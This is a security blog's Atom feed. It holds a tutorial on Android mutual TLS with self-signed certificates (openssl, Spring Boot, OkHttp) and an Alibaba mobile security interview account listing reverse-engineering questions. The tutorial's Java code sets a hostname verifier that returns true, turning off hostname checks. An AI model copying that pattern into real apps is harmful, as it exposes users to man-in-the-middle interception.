<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>欢迎来到安全后厨！</title>
  
  
  <link href="http://security-kitchen.com/atom.xml" rel="self"/>
  
  <link href="http://security-kitchen.com/"/>
  <updated>2023-12-24T14:13:13.637Z</updated>
  <id>http://security-kitchen.com/</id>
  
  <author>
    <name>安全后厨团队</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android自定义证书实现双向认证1（littleQ）</title>
    <link href="http://security-kitchen.com/2023/12/24/littleQ/"/>
    <id>http://security-kitchen.com/2023/12/24/littleQ/</id>
    <published>2023-12-23T16:00:00.000Z</published>
    <updated>2023-12-24T14:13:13.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android自定义证书实现双向认证（littleQ）"><a href="#Android自定义证书实现双向认证（littleQ）" class="headerlink" title="Android自定义证书实现双向认证（littleQ）"></a>Android自定义证书实现双向认证（littleQ）</h1><p>作者：littleQ</p><p>相信各位读者至少应该是见过使用双向认证的Android程序了，那么如果作为开发者，我们如何来实现双向认证呢，本文来一起看一下如何利用自签名证书实现双向认证。</p><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>要实现双向认证，我们首先肯定是要生成证书了，这里工具我选择的是openssl，在mac&#x2F;ubuntu上这个命令是可以直接执行的，在win上，自行安装下吧，环境安装不在本文的讨论范围之内。</p><h3 id="利用openssl生成CA证书"><a href="#利用openssl生成CA证书" class="headerlink" title="利用openssl生成CA证书"></a>利用openssl生成CA证书</h3><h4 id="生成CA根证书"><a href="#生成CA根证书" class="headerlink" title="生成CA根证书"></a>生成CA根证书</h4><ul><li>生成密钥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out rootCA.key 2048</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_uAz6w8n6Lh.png"></p><ul><li>生成请求文件(csr)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key rootCA.key -out rootCA.csr -sha256</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_8na2w7mJ9L.png"></p><p>这里里面内容可以随便输，没什么影响。</p><ul><li>生成crt证书</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -<span class="keyword">in</span> rootCA.csr -signkey rootCA.key -out rootCA.crt -sha256</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_wos7giaHeG.png"></p><h3 id="自签名证书生成（服务端）"><a href="#自签名证书生成（服务端）" class="headerlink" title="自签名证书生成（服务端）"></a>自签名证书生成（服务端）</h3><ul><li>生成密钥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out serverCA.key 2048</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_OxVFSZScZt.png"></p><ul><li>生成请求文件(csr)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new  -key serverCA.key -out serverCA.csr -sha256</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_JD-nsnLSwA.png"></p><p>这里需要注意下，这里必须和访问的域名一致，这里我用的ip地址，所以这里填我的ip地址，这里读者要根据自己的情况来处理。</p><ul><li>生成crt证书</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -<span class="keyword">in</span> serverCA.csr -out serverCA.crt -sha256</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_Ia9oFzkR5r.png"></p><p>这里一共可以生成7个文件，如果生成少了，大概率是前面做错了，需要重新做。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_nCeIYIWmZ7.png"></p><h2 id="后端搭建"><a href="#后端搭建" class="headerlink" title="后端搭建"></a>后端搭建</h2><p>因为这是双向认证，所以我们需要搭建一个后端，这里我们采用springboot来搭建后端。</p><h3 id="将服务端密钥-key文件转换为-p12文件"><a href="#将服务端密钥-key文件转换为-p12文件" class="headerlink" title="将服务端密钥.key文件转换为.p12文件"></a>将服务端密钥.key文件转换为.p12文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -<span class="built_in">export</span> -clcerts -<span class="keyword">in</span> serverCA.crt -inkey serverCA.key -out serverCA.p12</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_mJrnQk3XzS.png"></p><p>这里需要输入一个密码，需要记住，后面要用。</p><p>来看下我们生成的证书。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -keystore serverCA.p12</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_rEKoZFVQ0J.png"></p><p>注意，有这个打印才能是成功的，要注意，这里的指纹是SHA-256的，如果是SHA1，请注意这个Android10不认，需要重新搞，这里需要输入刚才设置的密码，密码先别忘记，等会还要用。</p><h3 id="新建一个springboot项目"><a href="#新建一个springboot项目" class="headerlink" title="新建一个springboot项目"></a>新建一个springboot项目</h3><p>这个就不展开讲了，直接新建即可，然后在<code>application.yml</code>里面配置如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">18443</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/api</span></span><br><span class="line">  <span class="attr">ssl:</span></span><br><span class="line">    <span class="attr">key-store:</span> <span class="string">classpath:serverCA.p12</span></span><br><span class="line">    <span class="attr">key-store-password:</span> <span class="string">这是刚才所输入的密码</span></span><br><span class="line">    <span class="attr">keyStoreType:</span> <span class="string">PKCS12</span></span><br><span class="line">    <span class="attr">keyAlias:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后写个helloword运行一下，我们直接来访问下。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_lTdR1VpcQy.png"></p><p>这就说明了，这里我们需要用https的形式来访问，切换到https之后，访问是正常的，因为这里是自签名证书，所以Chrome不认，报了危险。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_zOy3CHG1cE.png"></p><p>然后，我们来看证书的信息</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_dvxtinkLry.png"></p><p>这里和我们刚才的输入是一致的。</p><h3 id="Android使用OKhttp访问"><a href="#Android使用OKhttp访问" class="headerlink" title="Android使用OKhttp访问"></a>Android使用OKhttp访问</h3><p>新建一个Android项目，然后引入OKhttp的包，这里新建Android项目也不过多介绍了，注意别忘了添加联网权限。这里只粘贴关键代码，其他代码自行补充完整。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">// 这里需要粘贴自己证书的内容</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ROOT_CA_CERT</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        OkHttpClient.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().newBuilder()</span><br><span class="line">                .retryOnConnectionFailure(<span class="literal">false</span>)</span><br><span class="line">                .connectTimeout(<span class="number">60</span>, TimeUnit.SECONDS)</span><br><span class="line">                .readTimeout(<span class="number">60</span>, TimeUnit.SECONDS)</span><br><span class="line">                .writeTimeout(<span class="number">60</span>, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// region TrustManager</span></span><br><span class="line">        <span class="type">TrustManagerFactory</span> <span class="variable">trustManagerFactory</span> <span class="operator">=</span></span><br><span class="line">                <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());</span><br><span class="line">            trustManagerFactory.init(getKeyStore());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException | KeyStoreException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TrustManager[] trustManagers = trustManagerFactory.getTrustManagers();</span><br><span class="line">        <span class="keyword">if</span> (trustManagers.length != <span class="number">1</span> || !(trustManagers[<span class="number">0</span>] <span class="keyword">instanceof</span> X509TrustManager)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unexpected default trust managers:&quot;</span></span><br><span class="line">                    + Arrays.toString(trustManagers));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">X509TrustManager</span> <span class="variable">trustManager</span> <span class="operator">=</span> (X509TrustManager) trustManagers[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// endregion</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// region SSLContext</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">sslContext</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            sslContext.init(<span class="literal">null</span>, trustManagers, <span class="keyword">new</span> <span class="title class_">SecureRandom</span>());</span><br><span class="line">            builder.sslSocketFactory(sslContext.getSocketFactory(), trustManager);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeyManagementException | NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// endregion</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对hostname进行校验, 这里直接返回true, 这里可以取到之前设置的IP</span></span><br><span class="line">        builder.hostnameVerifier((String hostname, SSLSession session) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ... 发送请求并验证</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> KeyStore <span class="title function_">getKeyStore</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 添加https证书</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CertificateFactory</span> <span class="variable">certificateFactory</span> <span class="operator">=</span> CertificateFactory.getInstance(<span class="string">&quot;X.509&quot;</span>);</span><br><span class="line">            <span class="type">KeyStore</span> <span class="variable">keyStore</span> <span class="operator">=</span> KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class="line">            keyStore.load(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Buffer</span>().writeUtf8(ROOT_CA_CERT).inputStream();</span><br><span class="line">            <span class="comment">// 签名文件设置证书</span></span><br><span class="line">            keyStore.setCertificateEntry(<span class="string">&quot;0&quot;</span>, certificateFactory.generateCertificate(is));</span><br><span class="line">            is.close();</span><br><span class="line">            <span class="keyword">return</span> keyStore;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这个内容，说明是成功了的，否则就是失败了。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_RYhvy0zAZN.png"></p><p>到目前为止，我们已经完成了单向认证，也就是客户端校验服务端的证书，也就是标准的https的过程，接下来我们一起在此基础之上看一下双向认证是如何来实现的。</p><h2 id="双向认证"><a href="#双向认证" class="headerlink" title="双向认证"></a>双向认证</h2><ul><li>根据上述生成服务端证书的方法生成客户端的证书</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out clientCA.key 2048</span><br><span class="line">openssl req -new  -key clientCA.key -out clientCA.csr -sha256</span><br><span class="line">openssl x509 -req -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -<span class="keyword">in</span> clientCA.csr -out clientCA.crt -sha256</span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -clcerts -<span class="keyword">in</span> clientCA.crt -inkey clientCA.key -out clientCA.p12</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_QxV35eFf_D.png"></p><p>这里，同样需要输入密码，也是要记住的。</p><ul><li>将上面的证书转换为Android可用的格式</li></ul><p><a href="https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16" title="https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16">https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16</a>下载这个工具转换即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore clientCA.p12 -srcstoretype pkcs12 -destkeystore clientCA.bks -deststoretype bks -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath bcprov-jdk16-1.46.jar</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_IXehv1H0uW.png"></p><p>这个密码和上面一致就可以了。</p><ul><li>修改Android代码，添加新的证书</li></ul><p>这里，只贴出了差异的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// region 双向认证服务端证书</span></span><br><span class="line">        <span class="type">KeyStore</span> <span class="variable">clientKeyStore</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">SSLContext</span> <span class="variable">sslContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientKeyStore = KeyStore.getInstance(<span class="string">&quot;BKS&quot;</span>);</span><br><span class="line">            clientKeyStore.load(getApplicationContext().getAssets().open(<span class="string">&quot;clientCA.bks&quot;</span>), <span class="string">&quot;刚才需要记住的密码&quot;</span>.toCharArray());</span><br><span class="line">            <span class="type">KeyManagerFactory</span> <span class="variable">keyManagerFactory</span> <span class="operator">=</span></span><br><span class="line">                    KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());</span><br><span class="line">            keyManagerFactory.init(clientKeyStore, <span class="string">&quot;刚才需要记住的密码&quot;</span>.toCharArray());</span><br><span class="line">            sslContext = SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            sslContext.init(keyManagerFactory.getKeyManagers(), trustManagers, <span class="keyword">new</span> <span class="title class_">SecureRandom</span>());</span><br><span class="line">            builder.sslSocketFactory(sslContext.getSocketFactory(), trustManager);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeyStoreException | IOException | NoSuchAlgorithmException | UnrecoverableKeyException | CertificateException | KeyManagementException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// endregion</span></span><br><span class="line"></span><br><span class="line">        builder.hostnameVerifier((String hostname, SSLSession session) -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> Certificate[] certs = session.getPeerCertificates();</span><br><span class="line">                <span class="keyword">final</span> <span class="type">X509Certificate</span> <span class="variable">x509</span> <span class="operator">=</span> (X509Certificate) certs[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">return</span> verifyHostName(hostname, x509);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> SSLException ex) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>转换服务端根证书到keystore格式</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -import -file rootCA.crt -<span class="built_in">alias</span> rootCA -keystore rootCA.keystore -storepass 密码</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_esGXxpchqu.png"></p><ul><li>配置服务端证书</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="attr">client-auth:</span> <span class="string">need</span></span><br><span class="line">    <span class="attr">trust-store:</span> <span class="string">classpath:rootCA.keystore</span></span><br><span class="line">    <span class="attr">trust-store-password:</span> <span class="string">刚才的密码</span></span><br><span class="line">    <span class="attr">trust-store-type:</span> <span class="string">JKS</span></span><br><span class="line">    <span class="attr">trust-store-provider:</span> <span class="string">SUN</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后，我们直接用Chrome打开看一下。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_LelbMjw5CP.png"></p><p>这里，提示我们客户端证书校验失败，这就是后端配置成功了，然后我们运行下app来看一下。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_ZcOGc8nqaO.png"></p><p>发现，客户端是可以获取成功的，到这里我们双向认证就完成了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们可能经常遇到使用了双向认证的APP，但是咱们能不能自己实现一下这个双向认证呢，本文主要是给大家提供了一个自签名证书实现双向认证的方案，仅供参考。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p><a href="https://ma.ttias.be/how-to-read-ssl-certificate-info-from-the-cli/" title="https://ma.ttias.be/how-to-read-ssl-certificate-info-from-the-cli/">https://ma.ttias.be/how-to-read-ssl-certificate-info-from-the-cli/</a></p></li><li><p><a href="https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16" title="https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16">https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Android自定义证书实现双向认证（littleQ）&quot;&gt;&lt;a href=&quot;#Android自定义证书实现双向认证（littleQ）&quot; class=&quot;headerlink&quot; title=&quot;Android自定义证书实现双向认证（littleQ）&quot;&gt;&lt;/a&gt;Android自定义证书实现双向认证（littleQ）&lt;/h1&gt;&lt;p&gt;作者：littleQ&lt;/p&gt;
&lt;p&gt;相信各位读者至少应该是见过使用双向认证的Android程序了，那么如果作为开发者，我们如何来实现双向认证呢，本文来一起看一下如何利用自签名证书实现双向认证。&lt;/p&gt;</summary>
    
    
    
    <category term="Android开发" scheme="http://security-kitchen.com/categories/Android%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="抓包" scheme="http://security-kitchen.com/tags/%E6%8A%93%E5%8C%85/"/>
    
    <category term="Android开发" scheme="http://security-kitchen.com/tags/Android%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（8）——2023届阿里安全工程师面试经验分享</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0008/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0008/</id>
    <published>2023-03-08T02:28:19.000Z</published>
    <updated>2023-12-23T09:13:44.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2023届阿里安全工程师面试经验分享"><a href="#2023届阿里安全工程师面试经验分享" class="headerlink" title="2023届阿里安全工程师面试经验分享"></a>2023届阿里安全工程师面试经验分享</h2><p>大家好，我是同学小D，某985硕，硕士研究的方向是移动安全，分享一下秋招面试阿里的一些经验。<br>阿里我是找了一个认识的人内推到了他们部门，然后面试的岗位是安全工程师。最好是有内部认识的人内推，不然今年可能面试的机会都没有。然后我面的安全岗是没有笔试的，这边也没有hr给你约面试时间，基本就是给你打个电话就直接开始电话面试。</p><span id="more"></span><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>一面就是内推人来面，基本就是问了下对安卓安全的了解的一些基本情况，例如：</p><p>so加载流程总结？</p><p>so注入&#x2F;防止so注入 怎么去检测？</p><p>如何检测修改了系统源码&#x2F;如何反反反调试？</p><p>有没有分析过真实的壳？</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><p>二面当时是有三个面试官进行面试，然后也是电话面试，问的问题就比较细致：</p><p>一代、二代、Vmp、dex2C的原理，以及脱壳的原理？</p><p>平时使用什么语言编程？讲一讲python的深拷贝、浅拷贝？</p><p>反frida、反xposed的方法和原理？</p><p>ida调试的原理?</p><p>在字节实习做的工作？解决了哪些问题？</p><p>arm汇编的知识点？</p><p>安卓中有哪些hook方法？inline hook、plt hook的原理？</p><p>在学校中做的工作，详细问一些细节？</p><p>virtual app原理？</p><p>二进制分析中遇到的最有难度的问题？怎么解决的？</p><p>OLLVM混淆的原理，如何解决OLLVM混淆？</p><p>安卓相关安全漏洞原理？</p><p>对web、js相关漏洞是否了解？</p><h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><p>三面和二面问的东西基本上差不多，都是安卓安全的一些知识。</p><h3 id="四面"><a href="#四面" class="headerlink" title="四面"></a>四面</h3><p>四面是部门的大leader来面</p><p>主要问你做的方向是什么，在网络安全这个有多少年经验了？</p><p>做过的最有意思的项目？</p><p>最有成就感的事？</p><p>如果你被其他厂录取，你是否更愿意来阿里？</p><p>然后很扯的是前面几面都告诉我通过了，最后等了很久有一天阿里的人打电话问我有没有其他offer了，当时我想着如实回答就说已经签了一家保底，然后那边就说既然你已经签了那我们这边流程就不再进行了。所以建议如果其他offer还没确定拿到或者其他拿到的offer还不是很满意可以先说没有，因为今年好像是各个公司的hc也很紧张，他们也怕你接了offer又不去。然后建议大家在秋招开始之前能先实习就找个地方实习，有实习经验还是很加分的。</p><p>整体情况就是这些，希望能帮助到大家！</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;2023届阿里安全工程师面试经验分享&quot;&gt;&lt;a href=&quot;#2023届阿里安全工程师面试经验分享&quot; class=&quot;headerlink&quot; title=&quot;2023届阿里安全工程师面试经验分享&quot;&gt;&lt;/a&gt;2023届阿里安全工程师面试经验分享&lt;/h2&gt;&lt;p&gt;大家好，我是同学小D，某985硕，硕士研究的方向是移动安全，分享一下秋招面试阿里的一些经验。&lt;br&gt;阿里我是找了一个认识的人内推到了他们部门，然后面试的岗位是安全工程师。最好是有内部认识的人内推，不然今年可能面试的机会都没有。然后我面的安全岗是没有笔试的，这边也没有hr给你约面试时间，基本就是给你打个电话就直接开始电话面试。&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（7）——2023届OPPO秋季招聘面试</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0007/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0007/</id>
    <published>2023-03-08T02:27:19.000Z</published>
    <updated>2023-12-23T09:13:44.117Z</updated>
    
